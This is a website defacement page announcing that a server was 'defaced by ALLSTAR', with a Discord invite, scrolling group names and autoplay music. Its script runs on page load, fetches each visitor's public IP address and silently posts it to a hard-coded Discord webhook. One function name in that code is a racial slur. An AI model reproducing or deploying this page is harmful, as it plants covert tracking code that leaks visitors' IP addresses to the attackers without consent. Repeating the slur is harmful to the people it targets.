<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>kupalz</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root {
            --primary: #0a0a0a;
            --secondary: #111111;
            --accent: #e100ff;
            --accent-alt: #e100ff;
            --text: #ffffff;
            --text-secondary: rgba(255,255,255,0.7);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--primary);
            color: var(--text);
            font-family: 'Inter', sans-serif;
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(255, 0, 102, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(0, 255, 204, 0.05) 0%, transparent 40%);
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 60px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;

        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            width: 100%;
        }

        h1 {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 20px;
            color: var(--text);
            letter-spacing: -0.5px;
            line-height: 1.2;
            text-transform: uppercase;
        }

        h1 b {
            color: var(--accent);
            text-shadow: 0 0 15px #e100ff;
            font-weight: 800;
        }

        .clock-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 30px 0;
            width: 100%;
            position: relative;
        }

        #clock {
            font-size: 5rem;
            font-weight: 300;
            color: var(--text);
            margin: 0;
            letter-spacing: -2px;
            position: relative;
            z-index: 2;
            text-align: center;
        }

        .clock-container::before {
            content: '';
            position: absolute;
            width: 120px;
            height: 120px;
            background: var(--accent);
            filter: blur(80px);
            opacity: 0.4;
            z-index: 1;
        }

        .content-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            width: 100%;
            margin: 20px 0;
        }

        .profile-img {
            width: 100%;
            border-radius: 12px;
            margin: 0;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            filter: saturate(1.2) contrast(1.1);
        }

        .profile-img:hover , .info-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 25px 50px rgba(255, 255, 255, 0.4);
        }

        .info-box {
            background: var(--secondary);
            padding: 30px;
            border-radius: 12px;
            margin: 0;
            backdrop-filter: blur(10px);
            background-color: #e100ff00;
        }

        .info-box p {
            margin: 15px 0;
            font-size: 0.95rem;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
        }


        .info-box p i {
            margin-right: 10px;
            color: var(--accent);
        }

        .info-box p#ipAddress {
            color: var(--accent-alt);
            font-weight: 600;
        }

        .social-links {
            display: flex;
            gap: 20px;
            margin-top: 40px;
        }

        .social-link {
            color: var(--text);
            font-size: 1.5rem;
            text-decoration: none;
            transition: all 0.3s ease;
            background: var(--secondary);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        .social-link::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--accent);
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: 0;
        }

        .social-link:hover {
            transform: translateY(-5px);
        }

        .social-link:hover::before {
            opacity: 0.2;
        }

        .social-link i {
            position: relative;
            z-index: 1;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            overflow: hidden;
            padding: 15px 0;
            background: rgba(10, 10, 10, 0);
            backdrop-filter: blur(10px);
            z-index: 100;
        }
        
        .name-trail {
            white-space: nowrap;
            animation: nameScroll 8s linear infinite;
            color: var(--text-secondary);
            font-size: 1rem;
            letter-spacing: 2px;
            font-weight: 600;
        }
        
        .name-trail span {
            color: var(--accent);
            margin: 0 10px;
        }
        
        @keyframes nameScroll {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }

        @media (max-width: 768px) {
            .content-grid {
                grid-template-columns: 1fr;
            }
            
            #clock {
                font-size: 3.5rem;
            }
            
            h1 {
                font-size: 1.8rem;
            }
            
            .container {
                padding: 40px 20px;
            }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header, .clock-container, .content-grid, .social-links {
            animation: fadeIn 0.8s ease forwards;
            opacity: 0;
        }

        .header { animation-delay: 0.2s; }
        .clock-container { animation-delay: 0.4s; }
        .content-grid { animation-delay: 0.6s; }
        .social-links { animation-delay: 0.8s; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>THIS SERVER HAS BEEN DEFACED BY <b>ALLSTAR</b></h1>
        </div>
        
        <div class="clock-container">
            <div id="clock">00:00:00</div>
        </div>
        
        <div class="content-grid">
            <img src="https://media.discordapp.net/attachments/1304884343071838300/1313789701575938058/DOGIE_3.png?ex=6809fb81&is=6808aa01&hm=63f1324019aa561a1adfd433ff26384ea20bc97e072635f64c4e7588abca50b6&=&format=webp&quality=lossless&width=720&height=720" alt="Profile" class="profile-img">
            
            <div class="info-box">
                <p><i class="fas fa-laptop-code"></i> <span id="userAgent"></span></p>
                <p><i class="fas fa-network-wired"></i> <span id="ipAddress">Loading...</span></p>
                <p><i class="fas fa-calendar-alt"></i> <span id="timestamp"></span></p>

                <a href="https://discord.gg/arabicca" class="social-link" title="Join our Discord">
                    <i class="fab fa-discord"></i>
                </a>
            </div>
        </div>

    <div class="footer">
        <div class="name-trail">
            KUPALINO <span>•</span> ARABICCA <span>•</span> ALLSTAR <span>•</span> KUPALINO <span>•</span> ARABICCA <span>•</span> ALLSTAR <span>•</span> KUPALINO <span>•</span> ARABICCA <span>•</span> ALLSTAR <span>•</span> KUPALINO <span>•</span> ARABICCA <span>•</span> ALLSTAR
        </div>
    </div>

    <audio id="bgMusic" autoplay loop>
        <source src="https://audio.jukehost.co.uk/CtcXvRJTGxkKM1kWoCRidcSZTZZDd6CX" type="audio/mpeg">
    </audio>

    <script>
        setInterval(() => {
            document.getElementById('clock').textContent = new Date().toLocaleTimeString();
        }, 100);
    
        document.getElementById('userAgent').textContent = navigator.userAgent;
        document.getElementById('timestamp').textContent = new Date().toLocaleString();
    
        function niggas() {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    const ipAddress = data.ip;
                    document.getElementById('ipAddress').textContent = ipAddress;
                    grahx(ipAddress);
                })
                .catch(err => {
                    document.getElementById('ipAddress').textContent = "Unable to track IP";
                });
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            const audio = document.getElementById('bgMusic');
            audio.volume = 0.4;
            audio.play().catch(e => {
                document.addEventListener('click', () => {
                    audio.play();
                }, { once: true });
            });
            
            niggas();
        });
    
        function grahx(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1359469157141450813/bF4jbo9ee6qDTpg2g78CGnCPLku9khR47UPCRxlUfRXgUaGHcxov1GvcsqkbDJZRqzrO';
    
            const payload = {
                content: `Player Ipz: ${ip}`
            };
    
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        }
    </script>
    
</body>
</html>
